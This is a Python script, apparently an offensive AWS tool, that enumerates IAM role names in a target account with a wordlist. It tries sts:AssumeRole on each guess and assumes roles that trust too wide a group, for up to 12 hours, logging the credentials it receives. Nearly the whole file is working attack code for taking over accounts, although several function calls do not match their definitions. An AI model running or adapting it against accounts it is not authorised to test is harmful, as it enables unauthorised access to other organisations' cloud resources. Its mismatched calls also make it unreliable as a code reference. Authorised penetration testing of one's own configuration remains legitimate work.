#!/usr/bin/env python
# -*- coding: utf-8 -*-

import boto3
import botocore
import random
import string
import json
from cli.log import LoggingApp

DESCRIPTION = """This script takes in an AWS account ID and tries to enumerate
role names within that account. If one is discovered and it is misconfigured
to allow role-assumption from a wide group, it is possible to assume that
role and gain access to that AWS account through this method.

NOTE: It is recommended to use personal AWS access keys for this script,
as it will spam CloudTrail with "AssumeRole" logs. The keys used must
have the sts:AssumeRole permission on any resource (*) to be able to
identify/assume a misconfigured role. Without the sts:AssumeRole permission,
you can still identify existing roles in the target account though.
"""


class EnumeratRoles(LoggingApp):

    attempts = 0
    restricted_roles = []
    successful_role_arn = ''
    word_list = []
    connection = None

    def random_string(self):
        return ''.join(
            random.choice(
                string.ascii_lowercase +
                string.ascii_uppercase +
                string.digits
            ) for _ in range(20)
        )

    def make_wordlist(self):
        quit("TODO: Implement Brute-force/Dictionary Attack")
        return None

    def get_wordlist(self, wordlist_path):
        with open(wordlist_path, 'r') as f:
            word_list = f.read().splitlines()
        return word_list

    def get_connection(self, profile):
        if profile:
            try:
                session = boto3.session.Session(
                    profile_name=self.params.profile
                )
            except botocore.exceptions.ProfileNotFound as e:
                self.log.warning(
                    'Cannot find the AWS profile: {}'.format(profile)
                )
                self.log.debug(e)
                session = boto3.session.Session()
                self.log.error(
                    'Available Profiles: {}'.format(session.available_profiles)
                )
                quit('Quitting!')
            client = session.client('sts')
        else:
            session = boto3.session.Session()
            self.log.warning(
                'No AWS Profile - choose one or add the --profile argument:'
            )
            profiles = session.available_profiles
            for i in range(0, len(profiles)):
                print('[{}] {}'.format(i, profiles[i]))
            profile_number = int(input(
                'Choose a profile (Ctrl+C to exit): '
            ).strip())
            session = boto3.session.Session(
                profile_name=profiles[profile_number]
            )
            client = session.client('sts')
        return client

    def main(self):   # pylint: disable=E0202
        self.account_id = self.params.accountid
        if not len(self.account_id) == 12 or not self.account_id.isdigit():
            quit(
                'AWS account IDs are 12 digits. You supplied: {}'.format(
                    self.params.accountid
                )
            )
        self.log.warning(
            'Ensure your role has sts:AssumeRole permissions for * resources'
        )
        if self.params.wordlist:
            self.word_list = self.get_wordlist(self.params.wordlist)
        else:
            self.word_list = self.make_wordlist()
        self.connection = self.get_client(self.params.profile)
        self.log.info('Targeting account ID: {}'.format(self.params.accountid))
        self.log.info('Starting role enumeration')
        r = self.enumerate(self.word_list)
        total_roles = len(r['restricted']) + len(r['successful'])
        if total_roles == 0:
            self.log.error('No roles were found.')
        else:
            self.log.warning("Restricted Roles:")
            for role in r['restricted']:
                self.log.warning(role)
            self.log.warning("Roles we can Assume:")
            for role in r['successful']:
                self.log.warning(role)
        self.log.warning(
            'Enumerator completed after {} attempts.'.format(
                self.attempts
            )
        )

    def enumerate(self, client, word_list):
        results = {
            "restricted": [],
            "successful": []
        }
        for word in word_list:
            role_arn = 'arn:aws:iam::{}:role/{}'.format(
                self.account_id, word
            )
            self.attempts += 1
            try:
                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName=self.random_string(),
                    DurationSeconds=43200
                )
                self.log.warning(
                    'Successfully assumed role for 12 hours: {}\n'.format(
                        role_arn
                    )
                )
                results['successful'].append(role_arn)
                response.pop('ResponseMetadata', None)
                self.log.debug(json.dumps(response, indent=2, default=str))
                if self.params.findfirst:
                    break
            except botocore.exceptions.ClientError as e:
                self.log.debug(e)
                if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(e):
                    # Found a vulnerable role!
                    self.log.warning(
                        'Found vulnerable role: {} **'.format(role_arn)
                    )
                    self.log.warning(
                        'Hit max session time limit, reverting to minimum of 1 hour.'
                    )
                    response = client.assume_role(
                        RoleArn=role_arn,
                        RoleSessionName=self.random_string(),
                        DurationSeconds=3600
                    )
                    self.log.warning(
                        'Successfully assumed role: {}'.format(role_arn)
                    )
                    results['successful'].append(role_arn)
                    response.pop('ResponseMetadata', None)
                    self.log.debug(json.dumps(response, indent=2, default=str))
                    if self.params.findfirst:
                        break
                elif 'Not authorized to perform sts:AssumeRole' in str(e):
                    # Role not found
                    self.log.debug("Role not found {}").format(role_arn)
                elif 'not authorized to perform: sts:AssumeRole on resource' in str(e):
                    # Role found, but not allowed to use it
                    self.log.warning(
                        'Found restricted role: {}\n'.format(
                            role_arn
                        )
                    )
                    results['restricted'].append(role_arn)
        return results


if __name__ == '__main__':
    app = EnumeratRoles(
        name="Enumerate AWS Roles",
        message_format='%(asctime)s [%(filename)s:%(lineno)s] - %(message)s',
        description=DESCRIPTION
    )
    app.add_param(
        '-p', '--profile', required=False, default=None,
        help='AWS CLI profile to use. You will be prompted by default.'
    )
    app.add_param(
        '-w', '--wordlist', required=False, default=None,
        help='File path to a word list to use. TODO: Bruteforce/dictionary'
    )
    app.add_param(
        '-a', '--accountid', required=True,
        help='ID of the target AWS account (12 digits).'
    )
    app.add_param(
        '-1', '--findfirst', required=False, default=None,
        help='If set to True will find the first account and exit',
    )
    app.run()
